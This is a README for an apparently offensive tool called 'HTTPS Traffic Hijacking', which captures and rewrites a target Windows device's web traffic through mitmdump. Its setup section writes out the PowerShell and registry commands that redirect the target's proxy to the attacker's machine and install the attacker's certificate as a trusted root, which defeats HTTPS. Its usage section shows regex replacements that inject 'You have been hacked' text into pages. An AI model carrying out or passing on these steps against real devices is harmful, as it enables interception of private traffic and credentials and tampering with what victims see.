# HTTPS Traffic Hijacking

<p align="center">
    <img width="700"
        src="images/001.png"
        alt="Main Banner"
        style="float: left; margin-right: 10px;">
</p>

**HTTPS Traffic Hijacking** is a tool that captures **HTTP** and **HTTPS** traffic from a target device using a proxy server powered by **mitmdump**, part of the **mitmproxy** toolkit. Root privileges on the target device are required.

With this tool, you can capture HTML code and modify it.

<p align="center">
    <img width="700"
        src="images/002.png"
        alt="Tool excecution Example"
        style="float: left; margin-right: 10px;">
</p>

## Table of contents

- [First stepts](#what-do-i-need-to-run-it)
    - [Required on your device](#setup-required-for-your-device)
    - [Required on target device](#steps-to-configure-target-device)
- [Usage](#how-does-it-work?)

## What do I need to run it?

### Setup required for your device

1. First, clone the repository:

    ```git
    git clone https://github.com/sammy-ulfh/traffic_hijacking.git
    ```

2. Then, navigate to the **traffic_hijacking/script/https** directory.

3. Next, download mitmproxy tool from [mitmproxy.org](https://mitmproxy.org/).


### Steps to configure target device

Execute all commands on a PowerShell.

1. First, retrive cert file:

```powershell
curl -o https://github.com/sammy-ulfh/traffic_hijacking/raw/refs/heads/main/script/https/cert/mitmproxy.cer
```

2. Second, run **mitmproxy** on your sniffing device.

3. Third, enable proxy settings:<br/>

    Set **ProxyEnable** registry key to 1.<br/>
    This key is located at:

    ```
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"
    ```
    
    You can update its value from the terminal using the following command:

    ```powershell
    reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
    ```

4. Fourth, set the proxy server adderss:<br/>

    Set the **ProxyServer** registry key to your proxy's IP and PORT, for example:<br/>
    "192.18.100.100:8080" -> "{YOUR IP}:{YOUR PROXY SERVER PORT}".<br/>
    This key is also located at:<br/>

    ```
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"
    ```

    You can update its value from the terminal using the followind command:

    ```powershell
    reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.100.100:8080" /f
    ```

    - **/v** specifies the name of the registry value you wan to modify.
    - **/t** specifies the data type to be stored. For example, **RED_SZ** represents a string value.
    - **/d** sets the data to be stored in the specified value.
    - **/f** forces the update without pompting for confirmation if the value already exists.

5. Fifth, trust your proxy's server Certificate:<br/>

    Use the **mitmproxy.cer** located in the  **script/cert** directory and add it to the Trusted Root Certification Authorities store:<br/>

    ```powershell
    Import-Certificate -FilePath ".\mitmproxy.cer" -CertStoreLocation Cert:\LocalMachine\Root
    ```

## How does it work?

This **HTTPS Traffic Hijacking** tool allows you to capture all HTTP and HTTPS traffic from a target device, focusing on modify the source code of a page.

Once you have completed all setup stepts, and you can see traffic being captured, it's time to run **mitmdump** on your capturing device usin the **https_hijacking.py** script.

```shell
./mitmdump -s https_hijacking.py --quiet
```

- **-s** lets you specify a custom script for **mitmdump** to process traffic as you define.
- **--quiet** supresses all logs, whosing only the output from your script.

Now, its time to provide potential matches and replacement to apply one-to-one replacements.

<p align="center">
    <img width="700"
        src="images/003.png"
        alt="Tool excecution Example"
        style="float: left; margin-right: 10px;">
</p>

- **match:**
    Provide a one or many text that can be a match separated by '<#>':.<br/>
    Example: ```"<title>.*</title>"```<br/>
    Example: ```"<title>.*</title><#><h1>.*</h1>"```

- **Replacements:**
    Provide replacements for each possible match:<br/>
    Example: ```"<title>H4cked! ;D</title>"```<br/>
    Example: ```"<title>H4cked! ;D</title><#><h1>You have been hacked! ;D</h1>"```

How works on the target devide:

<p align="center">
    <img width="700"
        src="images/004.png"
        alt="Tool excecution Example"
        style="float: left; margin-right: 10px;">
</p>
